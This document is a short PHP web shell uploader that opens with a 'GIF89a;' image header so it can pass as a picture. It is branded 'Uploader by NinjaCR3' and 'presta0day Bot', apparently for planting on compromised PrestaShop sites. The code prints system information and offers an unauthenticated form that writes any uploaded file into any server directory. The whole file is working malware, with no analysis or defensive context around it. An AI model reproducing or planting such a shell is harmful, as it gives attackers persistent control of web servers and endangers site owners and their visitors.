GIF89a;
<?php 
echo '<html><form action="" method="POST" enctype="multipart/form-data" name="uploader" id="uploader"><title>Uploader by NinjaCR3</title><h2>Uploader by NinjaCR3<br>presta0day Bot</h2>';
echo php_uname();
echo '<br><br><input type="file" name="file" size="50"><br><br><input type="text" name="dizin" size="60" value="'.getcwd().'">&nbsp;<input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ($_POST['_upl'] == "Upload") {
	chdir($_POST['dizin']);
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo 'Upload OK :)';
    } else {
        echo 'Upload Fail :(';
    }
}
?>